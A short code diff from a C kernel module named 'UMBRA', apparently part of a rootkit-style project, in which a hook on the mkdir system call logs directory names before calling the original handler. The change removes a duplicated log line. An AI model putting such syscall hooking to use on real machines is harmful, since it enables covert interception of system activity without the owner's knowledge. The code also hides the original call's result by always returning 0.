@@ -54,7 +54,6 @@ asmlinkage int hook_mkdir(const char __user *pathname, umode_t mode){
     if (err>0){
         printk(KERN_INFO "UMBRA:: Trying to create directory with name %s\n", dir_name);
     }
-        printk(KERN_INFO "UMBRA:: Trying to create directory with name %s\n", dir_name);
 
     orig_mkdir(pathname, mode);
     return 0;
